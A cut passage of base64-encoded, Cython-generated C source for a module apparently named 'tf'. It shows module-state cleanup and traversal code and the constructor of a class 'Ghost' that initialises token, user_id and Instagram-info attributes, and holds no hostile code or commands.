XBlXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByKTsKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X3B0eXBlXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByKTsKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X3R5cGVfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIpOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfcHR5cGVfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF80X2dlbmV4cHIpOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfdHlwZV8ydGZfX19weXhfc2NvcGVfc3RydWN0XzRfZ2VuZXhwcik7CiAgZm9yIChpbnQgaT0wOyBpPDE7ICsraSkgeyBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X3NsaWNlW2ldKTsgfQogIGZvciAoaW50IGk9MDsgaTwyMzsgKytpKSB7IFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfdHVwbGVbaV0pOyB9CiAgZm9yIChpbnQgaT0wOyBpPDIwOyArK2kpIHsgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9jb2Rlb2JqX3RhYltpXSk7IH0KICBmb3IgKGludCBpPTA7IGk8NDQwOyArK2kpIHsgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9zdHJpbmdfdGFiW2ldKTsgfQogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzApOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzEpOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzIpOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzMpOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzYpOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzkpOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzEwKTsKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8xNSk7CiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMTYpOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzMwKTsKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8zMik7CiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMTAwKTsKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8xMTEpOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzE1MCk7CiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMjAwKTsKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF85OTkpOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzEzMDApOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzIwMDApOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzIwMTApOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzIwMTEpOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzIwMTIpOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzIwMTMpOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzIwMTQpOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzIwMTUpOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzIwMTYpOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzIwMTcpOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzIwMTgpOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzIwMTkpOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzEyNzkwMDApOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzEyNzkwMDEpOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzE3NzUwMDAwKTsKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8xNzc1MDAwMSk7CiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMjc5NzYwMDAwKTsKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yNzk3NjAwMDEpOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzkwMDk5MDAwMCk7CiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfOTAwOTkwMDAxKTsKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8xNjI5MDEwMDAwKTsKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8xOTAwMDAwMDAwKTsKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yNTAwMDAwMDAwKTsKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8zNzEzNjY4Nzg2KTsKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF81Njk5Nzg1MjE3KTsKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF84NTA3OTQwNjM0KTsKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yMTI1NDAyOTgzNCk7CiAgcmV0dXJuIDA7Cn0KI2VuZGlmCgojaWYgQ1lUSE9OX1VTRV9NT0RVTEVfU1RBVEUKc3RhdGljIENZVEhPTl9TTUFMTF9DT0RFIGludCBfX3B5eF9tX3RyYXZlcnNlKFB5T2JqZWN0ICptLCB2aXNpdHByb2MgdmlzaXQsIHZvaWQgKmFyZykgewogIF9fcHl4X21zdGF0ZXR5cGUgKnRyYXZlcnNlX21vZHVsZV9zdGF0ZSA9IF9fUHl4X1B5TW9kdWxlX0dldFN0YXRlKG0pOwogIGlmICghdHJhdmVyc2VfbW9kdWxlX3N0YXRlKSByZXR1cm4gMDsKICBQeV9WSVNJVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2QpOwogIFB5X1ZJU0lUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfYik7CiAgUHlfVklTSVQodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9jeXRob25fcnVudGltZSk7CiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9lbXB0eV90dXBsZSk7CiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9lbXB0eV9ieXRlcyk7CiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9lbXB0eV91bmljb2RlKTsKICAjaWZkZWYgX19QeXhfQ3lGdW5jdGlvbl9VU0VECiAgUHlfVklTSVQodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9DeUZ1bmN0aW9uVHlwZSk7CiAgI2VuZGlmCiAgI2lmZGVmIF9fUHl4X0Z1c2VkRnVuY3Rpb25fVVNFRAogIFB5X1ZJU0lUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfRnVzZWRGdW5jdGlvblR5cGUpOwogICNlbmRpZgogIFB5X1ZJU0lUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfcHR5cGVfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF9fdGxsKTsKICBQeV9WSVNJVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X3R5cGVfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF9fdGxsKTsKICBQeV9WSVNJVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X3B0eXBlXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByKTsKICBQeV9WSVNJVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X3R5cGVfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIpOwogIFB5X1ZJU0lUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfcHR5cGVfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIpOwogIFB5X1ZJU0lUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfdHlwZV8ydGZfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcik7CiAgUHlfVklTSVQodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9wdHlwZV8ydGZfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwcik7CiAgUHlfVklTSVQodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF90eXBlXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByKTsKICBQeV9WSVNJVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X3B0eXBlXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfNF9nZW5leHByKTsKICBQeV9WSVNJVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X3R5cGVfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF80X2dlbmV4cHIpOwogIGZvciAoaW50IGk9MDsgaTwxOyArK2kpIHsgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9zbGljZVtpXSk7IH0KICBmb3IgKGludCBpPTA7IGk8MjM7ICsraSkgeyBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X3R1cGxlW2ldKTsgfQogIGZvciAoaW50IGk9MDsgaTwyMDsgKytpKSB7IF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfY29kZW9ial90YWJbaV0pOyB9CiAgZm9yIChpbnQgaT0wOyBpPDQ0MDsgKytpKSB7IF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfc3RyaW5nX3RhYltpXSk7IH0KICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8wKTsKICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8xKTsKICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yKTsKICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8zKTsKICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF82KTsKICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF85KTsKICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8xMCk7CiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMTUpOwogIF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzE2KTsKICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8zMCk7CiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMzIpOwogIF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzEwMCk7CiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMTExKTsKICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8xNTApOwogIF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzIwMCk7CiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfOTk5KTsKICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8xMzAwKTsKICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yMDAwKTsKICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yMDEwKTsKICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yMDExKTsKICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yMDEyKTsKICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yMDEzKTsKICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yMDE0KTsKICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yMDE1KTsKICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yMDE2KTsKICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yMDE3KTsKICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yMDE4KTsKICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yMDE5KTsKICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8xMjc5MDAwKTsKICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8xMjc5MDAxKTsKICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8xNzc1MDAwMCk7CiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMTc3NTAwMDEpOwogIF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzI3OTc2MDAwMCk7CiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMjc5NzYwMDAxKTsKICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF85MDA5OTAwMDApOwogIF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzkwMDk5MDAwMSk7CiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMTYyOTAxMDAwMCk7CiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMTkwMDAwMDAwMCk7CiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMjUwMDAwMDAwMCk7CiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMzcxMzY2ODc4Nik7CiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfNTY5OTc4NTIxNyk7CiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfODUwNzk0MDYzNCk7CiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMjEyNTQwMjk4MzQpOwogIHJldHVybiAwOwp9CiNlbmRpZgoKCgoKCnN0YXRpYyBQeU9iamVjdCAqX19weXhfcHdfMnRmXzVHaG9zdF8xX19pbml0X18oUHlPYmplY3QgKl9fcHl4X3NlbGYsIAojaWYgQ1lUSE9OX01FVEhfRkFTVENBTEwKUHlPYmplY3QgKmNvbnN0ICpfX3B5eF9hcmdzLCBQeV9zc2l6ZV90IF9fcHl4X25hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkcwojZWxzZQpQeU9iamVjdCAqX19weXhfYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHMKI2VuZGlmCik7IApzdGF0aWMgUHlNZXRob2REZWYgX19weXhfbWRlZl8ydGZfNUdob3N0XzFfX2luaXRfXyA9IHsiX19pbml0X18iLCAoUHlDRnVuY3Rpb24pKHZvaWQoKikodm9pZCkpKF9fUHl4X1B5Q0Z1bmN0aW9uX0Zhc3RDYWxsV2l0aEtleXdvcmRzKV9fcHl4X3B3XzJ0Zl81R2hvc3RfMV9faW5pdF9fLCBfX1B5eF9NRVRIX0ZBU1RDQUxMfE1FVEhfS0VZV09SRFMsIDB9OwpzdGF0aWMgUHlPYmplY3QgKl9fcHl4X3B3XzJ0Zl81R2hvc3RfMV9faW5pdF9fKFB5T2JqZWN0ICpfX3B5eF9zZWxmLCAKI2lmIENZVEhPTl9NRVRIX0ZBU1RDQUxMClB5T2JqZWN0ICpjb25zdCAqX19weXhfYXJncywgUHlfc3NpemVfdCBfX3B5eF9uYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHMKI2Vsc2UKUHlPYmplY3QgKl9fcHl4X2FyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzCiNlbmRpZgopIHsKICBQeU9iamVjdCAqX19weXhfdl9zZWxmID0gMDsKICAjaWYgIUNZVEhPTl9NRVRIX0ZBU1RDQUxMCiAgQ1lUSE9OX1VOVVNFRCBQeV9zc2l6ZV90IF9fcHl4X25hcmdzOwogICNlbmRpZgogIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKmNvbnN0ICpfX3B5eF9rd3ZhbHVlczsKICBQeU9iamVjdCogdmFsdWVzWzFdID0gezB9OwogIGludCBfX3B5eF9saW5lbm8gPSAwOwogIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDsKICBpbnQgX19weXhfY2xpbmVubyA9IDA7CiAgUHlPYmplY3QgKl9fcHl4X3IgPSAwOwogIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zCiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoIl9faW5pdF9fICh3cmFwcGVyKSIsIDApOwogICNpZiAhQ1lUSE9OX01FVEhfRkFTVENBTEwKICAjaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUKICBfX3B5eF9uYXJncyA9IFB5VHVwbGVfR0VUX1NJWkUoX19weXhfYXJncyk7CiAgI2Vsc2UKICBfX3B5eF9uYXJncyA9IFB5VHVwbGVfU2l6ZShfX3B5eF9hcmdzKTsgaWYgKHVubGlrZWx5KF9fcHl4X25hcmdzIDwgMCkpIHJldHVybiBOVUxMOwogICNlbmRpZgogICNlbmRpZgogIF9fcHl4X2t3dmFsdWVzID0gX19QeXhfS3dWYWx1ZXNfRkFTVENBTEwoX19weXhfYXJncywgX19weXhfbmFyZ3MpOwogIHsKICAgIFB5T2JqZWN0ICoqIGNvbnN0IF9fcHl4X3B5YXJnbmFtZXNbXSA9IHsmX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3NlbGYsMH07CiAgICBjb25zdCBQeV9zc2l6ZV90IF9fcHl4X2t3ZHNfbGVuID0gKF9fcHl4X2t3ZHMpID8gX19QeXhfTnVtS3dhcmdzX0ZBU1RDQUxMKF9fcHl4X2t3ZHMpIDogMDsKICAgIGlmICh1bmxpa2VseShfX3B5eF9rd2RzX2xlbikgPCAwKSBfX1BZWF9FUlIoMCwgNTYsIF9fcHl4X0wzX2Vycm9yKQogICAgaWYgKF9fcHl4X2t3ZHNfbGVuID4gMCkgewogICAgICBzd2l0Y2ggKF9fcHl4X25hcmdzKSB7CiAgICAgICAgY2FzZSAgMToKICAgICAgICB2YWx1ZXNbMF0gPSBfX1B5eF9BcmdSZWZfRkFTVENBTEwoX19weXhfYXJncywgMCk7CiAgICAgICAgaWYgKCFDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmIHVubGlrZWx5KCF2YWx1ZXNbMF0pKSBfX1BZWF9FUlIoMCwgNTYsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIENZVEhPTl9GQUxMVEhST1VHSDsKICAgICAgICBjYXNlICAwOiBicmVhazsKICAgICAgICBkZWZhdWx0OiBnb3RvIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yOwogICAgICB9CiAgICAgIGNvbnN0IFB5X3NzaXplX3Qga3dkX3Bvc19hcmdzID0gX19weXhfbmFyZ3M7CiAgICAgIGlmIChfX1B5eF9QYXJzZUtleXdvcmRzKF9fcHl4X2t3ZHMsIF9fcHl4X2t3dmFsdWVzLCBfX3B5eF9weWFyZ25hbWVzLCAwLCB2YWx1ZXMsIGt3ZF9wb3NfYXJncywgX19weXhfa3dkc19sZW4sICJfX2luaXRfXyIsIDApIDwgKDApKSBfX1BZWF9FUlIoMCwgNTYsIF9fcHl4X0wzX2Vycm9yKQogICAgICBmb3IgKFB5X3NzaXplX3QgaSA9IF9fcHl4X25hcmdzOyBpIDwgMTsgaSsrKSB7CiAgICAgICAgaWYgKHVubGlrZWx5KCF2YWx1ZXNbaV0pKSB7IF9fUHl4X1JhaXNlQXJndHVwbGVJbnZhbGlkKCJfX2luaXRfXyIsIDEsIDEsIDEsIGkpOyBfX1BZWF9FUlIoMCwgNTYsIF9fcHl4X0wzX2Vycm9yKSB9CiAgICAgIH0KICAgIH0gZWxzZSBpZiAodW5saWtlbHkoX19weXhfbmFyZ3MgIT0gMSkpIHsKICAgICAgZ290byBfX3B5eF9MNV9hcmd0dXBsZV9lcnJvcjsKICAgIH0gZWxzZSB7CiAgICAgIHZhbHVlc1swXSA9IF9fUHl4X0FyZ1JlZl9GQVNUQ0FMTChfX3B5eF9hcmdzLCAwKTsKICAgICAgaWYgKCFDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmIHVubGlrZWx5KCF2YWx1ZXNbMF0pKSBfX1BZWF9FUlIoMCwgNTYsIF9fcHl4X0wzX2Vycm9yKQogICAgfQogICAgX19weXhfdl9zZWxmID0gdmFsdWVzWzBdOwogIH0KICBnb3RvIF9fcHl4X0w2X3NraXA7CiAgX19weXhfTDVfYXJndHVwbGVfZXJyb3I6OwogIF9fUHl4X1JhaXNlQXJndHVwbGVJbnZhbGlkKCJfX2luaXRfXyIsIDEsIDEsIDEsIF9fcHl4X25hcmdzKTsgX19QWVhfRVJSKDAsIDU2LCBfX3B5eF9MM19lcnJvcikKICBfX3B5eF9MNl9za2lwOjsKICBnb3RvIF9fcHl4X0w0X2FyZ3VtZW50X3VucGFja2luZ19kb25lOwogIF9fcHl4X0wzX2Vycm9yOjsKICBmb3IgKFB5X3NzaXplX3QgX19weXhfdGVtcD0wOyBfX3B5eF90ZW1wIDwgKFB5X3NzaXplX3QpKHNpemVvZih2YWx1ZXMpL3NpemVvZih2YWx1ZXNbMF0pKTsgKytfX3B5eF90ZW1wKSB7CiAgICBQeV9YREVDUkVGKHZhbHVlc1tfX3B5eF90ZW1wXSk7CiAgfQogIF9fUHl4X0FkZFRyYWNlYmFjaygidGYuR2hvc3QuX19pbml0X18iLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTsKICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTsKICByZXR1cm4gTlVMTDsKICBfX3B5eF9MNF9hcmd1bWVudF91bnBhY2tpbmdfZG9uZTo7CiAgX19weXhfciA9IF9fcHl4X3BmXzJ0Zl81R2hvc3RfX19pbml0X18oX19weXhfc2VsZiwgX19weXhfdl9zZWxmKTsKCiAgCiAgZm9yIChQeV9zc2l6ZV90IF9fcHl4X3RlbXA9MDsgX19weXhfdGVtcCA8IChQeV9zc2l6ZV90KShzaXplb2YodmFsdWVzKS9zaXplb2YodmFsdWVzWzBdKSk7ICsrX19weXhfdGVtcCkgewogICAgUHlfWERFQ1JFRih2YWx1ZXNbX19weXhfdGVtcF0pOwogIH0KICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTsKICByZXR1cm4gX19weXhfcjsKfQoKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wZl8ydGZfNUdob3N0X19faW5pdF9fKENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3NlbGYsIFB5T2JqZWN0ICpfX3B5eF92X3NlbGYpIHsKICBQeU9iamVjdCAqX19weXhfciA9IE5VTEw7CiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnMKICBQeU9iamVjdCAqX19weXhfdF8xID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8yID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8zID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF80ID0gTlVMTDsKICBzaXplX3QgX19weXhfdF81OwogIGludCBfX3B5eF9saW5lbm8gPSAwOwogIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDsKICBpbnQgX19weXhfY2xpbmVubyA9IDA7CiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoIl9faW5pdF9fIiwgMCk7CgogIAogIGlmIChfX1B5eF9QeU9iamVjdF9TZXRBdHRyU3RyKF9fcHl4X3Zfc2VsZiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3Rva2VuLCBQeV9Ob25lKSA8ICgwKSkgX19QWVhfRVJSKDAsIDU3LCBfX3B5eF9MMV9lcnJvcikKCiAgCiAgaWYgKF9fUHl4X1B5T2JqZWN0X1NldEF0dHJTdHIoX19weXhfdl9zZWxmLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdXNlcl9pZCwgUHlfTm9uZSkgPCAoMCkpIF9fUFlYX0VSUigwLCA1OCwgX19weXhfTDFfZXJyb3IpCgogIAogIF9fcHl4X3RfMSA9IF9fUHl4X1B5RGljdF9OZXdQcmVzaXplZCgwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgNTksIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpOwogIGlmIChfX1B5eF9QeU9iamVjdF9TZXRBdHRyU3RyKF9fcHl4X3Zfc2VsZiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2luZm9pbnN0YSwgX19weXhfdF8xKSA8ICgwKSkgX19QWVhfRVJSKDAsIDU5LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9ER